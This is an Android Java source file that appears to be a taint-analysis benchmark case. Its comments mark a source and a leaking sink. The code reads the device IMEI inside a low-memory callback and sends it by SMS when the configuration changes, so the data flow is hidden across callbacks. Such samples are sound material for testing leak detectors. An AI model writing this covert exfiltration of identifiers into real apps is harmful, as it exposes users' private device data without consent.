package de.ecspride;

import android.app.Application;
import android.content.ComponentCallbacks2;
import android.content.Context;
import android.content.res.Configuration;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class MyApplication extends Application {
	
	ComponentCallbacks2 callbacks = new ComponentCallbacks2() {
		
		String imei;
		
		@Override
		public void onLowMemory() {
	        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			imei = telephonyManager.getDeviceId(); //source
		}
		
		@Override
		public void onConfigurationChanged(Configuration newConfig) {
	    	SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
		}
		
		@Override
		public void onTrimMemory(int level) {
			// TODO Auto-generated method stub
			
		}
	};
	
	@Override
	public void onCreate() {
		super.onCreate();
		this.registerComponentCallbacks(callbacks);
	}
	
	@Override
	public void onTerminate() {
		super.onTerminate();
		this.unregisterComponentCallbacks(callbacks);
	}

}
